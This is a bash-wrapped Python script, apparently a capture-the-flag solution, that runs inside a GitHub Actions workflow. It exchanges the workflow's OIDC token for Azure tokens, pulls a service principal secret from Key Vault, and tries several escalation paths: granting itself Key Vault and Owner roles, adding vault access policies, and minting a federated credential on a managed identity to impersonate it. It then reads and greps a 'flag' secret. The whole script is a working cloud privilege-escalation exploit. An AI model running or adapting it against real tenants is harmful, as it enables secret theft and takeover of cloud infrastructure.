#!/usr/bin/env bash
set +e
python3 - <<'PY'
import base64, json, os, re, time, urllib.parse, urllib.request, urllib.error, uuid

TEN  = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB  = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
CICD = "72ff278a-9e71-43ec-bac4-2ca303f8e462"
RG_P = "rg-tbl-platform-prod-sea"
RG_R = "rg-tbl-reporting-prod-eus"
ARM  = "https://management.azure.com"
KVSEC_NAME = "kv-tbl-sec-x3euoz"
KVSEC_SCOPE = f"/subscriptions/{SUB}/resourceGroups/{RG_P}/providers/Microsoft.KeyVault/vaults/{KVSEC_NAME}"
KVSEC_URL = f"https://{KVSEC_NAME}.vault.azure.net"
MI_NAME = "id-tbl-reporting-writer"
MI_SCOPE = f"/subscriptions/{SUB}/resourceGroups/{RG_R}/providers/Microsoft.ManagedIdentity/userAssignedIdentities/{MI_NAME}"

ROLES = {
  "KeyVaultSecretsUser":   "4633458b-17de-408a-b874-0445c86b69e6",
  "KeyVaultSecretsOfficer":"b86a8fe4-44ce-4948-aee5-eccb2c155cd7",
  "KeyVaultAdministrator": "00482a5a-887f-4fb3-b363-3b7fe8e74483",
  "Owner":                 "8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
}

BLOB = []
def note(tag, v):
    s = str(v); BLOB.append(tag + " :: " + s); print(tag, s[:900], flush=True)

def rq(u, m="GET", d=None, h=None, t=30):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, data=d, method=m, headers=h or {}), timeout=t)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode(errors="replace")
    except Exception as e: return 0, repr(e)

def fpost(u, o, t=30):
    return rq(u, "POST", urllib.parse.urlencode(o).encode(),
              {"Content-Type":"application/x-www-form-urlencoded"}, t)

def claims(jwt):
    try:
        seg = jwt.split(".")[1]; seg += "=" * (-len(seg) % 4)
        return json.loads(base64.urlsafe_b64decode(seg))
    except Exception: return {}

# ---------- OIDC ----------
s, b = rq(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange",
          "GET", None, {"Authorization":"Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
oidc = json.loads(b)["value"]
oc = claims(oidc)
OIDC_SUB = oc.get("sub",""); OIDC_ISS = oc.get("iss","")
note("OIDC_SUB", OIDC_SUB); note("OIDC_ISS", OIDC_ISS)

def fic_tok(client_id, scope):
    s, b = fpost(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token", {
        "client_id": client_id, "grant_type":"client_credentials", "scope": scope + "/.default",
        "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": oidc})
    try: return json.loads(b).get("access_token",""), b[:200]
    except Exception: return "", b[:200]

cicd_arm, e1 = fic_tok(CICD, "https://management.azure.com")
cicd_vault, e2 = fic_tok(CICD, "https://vault.azure.net")
note("CICD_ARM_LEN", len(cicd_arm)); note("CICD_VAULT_LEN", len(cicd_vault))
cicd_oid = claims(cicd_arm).get("oid","")
note("CICD_OID", cicd_oid)

# ---------- reporting SP ----------
sp_arm = sp_vault = ""; sp_oid = ""
s, b = rq("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4",
          "GET", None, {"Authorization":"Bearer " + cicd_vault})
try:
    sp = json.loads(json.loads(b)["value"])
    spcid = sp.get("appId") or sp.get("clientId")
    spsec = sp.get("clientSecret") or sp.get("password")
    def sptok(scope):
        s2,b2 = fpost(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
                      {"client_id":spcid,"grant_type":"client_credentials",
                       "client_secret":spsec,"scope":scope + "/.default"})
        try: return json.loads(b2).get("access_token","")
        except Exception: return ""
    sp_arm = sptok("https://management.azure.com"); sp_vault = sptok("https://vault.azure.net")
    sp_oid = claims(sp_arm).get("oid","")
    note("SP_APPID", spcid); note("SP_OID", sp_oid)
    note("SP_ARM_LEN", len(sp_arm)); note("SP_VAULT_LEN", len(sp_vault))
except Exception as ex:
    note("SP_ERR", repr(ex))

IDENTS = [("cicd", cicd_arm, cicd_vault, cicd_oid), ("sp", sp_arm, sp_vault, sp_oid)]

def read_flag(vault_tok, who):
    if not vault_tok: return False
    s, b = rq(KVSEC_URL + "/secrets/flag?api-version=7.4", "GET", None,
              {"Authorization":"Bearer " + vault_tok})
    note(f"FLAGREAD[{who}]", (s, b[:600]))
    return s == 200

# ---------- baseline: can we already read it? ----------
for who, a, v, o in IDENTS:
    read_flag(v, "baseline-" + who)

# ---------- enumerate effective permissions ----------
for who, a, v, o in IDENTS:
    if not a: continue
    for scope, label in [(KVSEC_SCOPE,"kvsec"), (MI_SCOPE,"mi"),
                         (f"/subscriptions/{SUB}/resourceGroups/{RG_P}","rgP"),
                         (f"/subscriptions/{SUB}/resourceGroups/{RG_R}","rgR"),
                         (f"/subscriptions/{SUB}","sub")]:
        s, b = rq(f"{ARM}{scope}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01",
                  "GET", None, {"Authorization":"Bearer " + a})
        note(f"PERMS[{who}][{label}]", (s, b[:1200]))

# ---------- existing role assignments on kvsec ----------
for who, a, v, o in IDENTS:
    if not a: continue
    s, b = rq(f"{ARM}{KVSEC_SCOPE}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()",
              "GET", None, {"Authorization":"Bearer " + a})
    note(f"RA_LIST[{who}][kvsec]", (s, b[:1500]))

# ---------- vault props (RBAC vs access policy) ----------
for who, a, v, o in IDENTS:
    if not a: continue
    s, b = rq(f"{ARM}{KVSEC_SCOPE}?api-version=2023-07-01", "GET", None,
              {"Authorization":"Bearer " + a})
    note(f"KVSEC_PROPS[{who}]", (s, b[:1200]))

# ---------- MI details ----------
mi_principal = ""; mi_client = ""
for who, a, v, o in IDENTS:
    if not a: continue
    s, b = rq(f"{ARM}{MI_SCOPE}?api-version=2023-01-31", "GET", None, {"Authorization":"Bearer " + a})
    note(f"MI_GET[{who}]", (s, b[:800]))
    if s == 200:
        try:
            pr = json.loads(b)["properties"]
            mi_principal = pr.get("principalId",""); mi_client = pr.get("clientId","")
        except Exception: pass
note("MI_PRINCIPAL", mi_principal); note("MI_CLIENT", mi_client)

# ---------- PATH A: self-assign KV role on kvsec ----------
for who, a, v, o in IDENTS:
    if not a or not o: continue
    for rname, rid in ROLES.items():
        url = f"{ARM}{KVSEC_SCOPE}/providers/Microsoft.Authorization/roleAssignments/{uuid.uuid4()}?api-version=2022-04-01"
        body = json.dumps({"properties":{
            "roleDefinitionId": f"/subscriptions/{SUB}/providers/Microsoft.Authorization/roleDefinitions/{rid}",
            "principalId": o, "principalType":"ServicePrincipal"}}).encode()
        s, b = rq(url, "PUT", body, {"Authorization":"Bearer " + a, "Content-Type":"application/json"})
        note(f"RA_PUT[{who}][{rname}]", (s, b[:400]))
        if s in (200,201):
            for attempt in range(12):
                time.sleep(5)
                nv, _ = fic_tok(CICD, "https://vault.azure.net") if who == "cicd" else (sptok("https://vault.azure.net"), "")
                if read_flag(nv, f"afterRA-{who}-{rname}-{attempt}"):
                    break
            break

# ---------- PATH C: vault access policy add ----------
for who, a, v, o in IDENTS:
    if not a or not o: continue
    url = f"{ARM}{KVSEC_SCOPE}/accessPolicies/add?api-version=2023-07-01"
    body = json.dumps({"properties":{"accessPolicies":[{
        "tenantId": TEN, "objectId": o,
        "permissions": {"secrets":["get","list"]}}]}}).encode()
    s, b = rq(url, "PUT", body, {"Authorization":"Bearer " + a, "Content-Type":"application/json"})
    note(f"AP_ADD[{who}]", (s, b[:400]))
    if s in (200,201):
        for attempt in range(8):
            time.sleep(5)
            nv, _ = fic_tok(CICD, "https://vault.azure.net") if who == "cicd" else (sptok("https://vault.azure.net"), "")
            if read_flag(nv, f"afterAP-{who}-{attempt}"):
                break

# ---------- PATH B: create FIC on the MI bound to this workflow, then act AS the MI ----------
if mi_client:
    subjects = [OIDC_SUB,
                "repo:duyhhh-oss/tebamoto-platform:pull_request",
                "repo:duyhhh-oss/tebamoto-platform:ref:refs/heads/main"]
    for who, a, v, o in IDENTS:
        if not a: continue
        for idx, subj in enumerate([s for s in subjects if s]):
            ficname = "ctf" + str(int(time.time()))[-6:] + str(idx)
            url = f"{ARM}{MI_SCOPE}/federatedIdentityCredentials/{ficname}?api-version=2023-01-31"
            body = json.dumps({"properties":{
                "issuer":"https://token.actions.githubusercontent.com",
                "subject": subj,
                "audiences":["api://AzureADTokenExchange"]}}).encode()
            s, b = rq(url, "PUT", body, {"Authorization":"Bearer " + a, "Content-Type":"application/json"})
            note(f"FIC_PUT[{who}][{subj}]", (s, b[:400]))
            if s not in (200,201): continue
            # mint token as the MI
            for attempt in range(12):
                time.sleep(5)
                mv, err = fic_tok(mi_client, "https://vault.azure.net")
                note(f"MI_FIC_VAULT[{attempt}]", (len(mv), err))
                if mv and read_flag(mv, f"asMI-{attempt}"):
                    break
                if mv:
                    # MI token works but cannot read -> self-assign role with MI's ARM token
                    ma, _ = fic_tok(mi_client, "https://management.azure.com")
                    if ma and mi_principal:
                        u2 = f"{ARM}{KVSEC_SCOPE}/providers/Microsoft.Authorization/roleAssignments/{uuid.uuid4()}?api-version=2022-04-01"
                        bd = json.dumps({"properties":{
                            "roleDefinitionId": f"/subscriptions/{SUB}/providers/Microsoft.Authorization/roleDefinitions/{ROLES['KeyVaultSecretsUser']}",
                            "principalId": mi_principal, "principalType":"ServicePrincipal"}}).encode()
                        s3, b3 = rq(u2, "PUT", bd, {"Authorization":"Bearer " + ma, "Content-Type":"application/json"})
                        note("MI_SELF_RA", (s3, b3[:400]))
                        for k in range(12):
                            time.sleep(5)
                            mv2, _ = fic_tok(mi_client, "https://vault.azure.net")
                            if mv2 and read_flag(mv2, f"asMI-afterRA-{k}"):
                                break
                    break

# ---------- final grep ----------
hay = "\n".join(BLOB)
hits = sorted(set(re.findall(r"DF26\{[^}]{1,200}\}", hay)))
print("==================================================", flush=True)
for h in hits: print("CTF_FLAG=" + h, flush=True)
if not hits: print("CTF_FLAG=<none found>", flush=True)
print("==================================================", flush=True)
PY
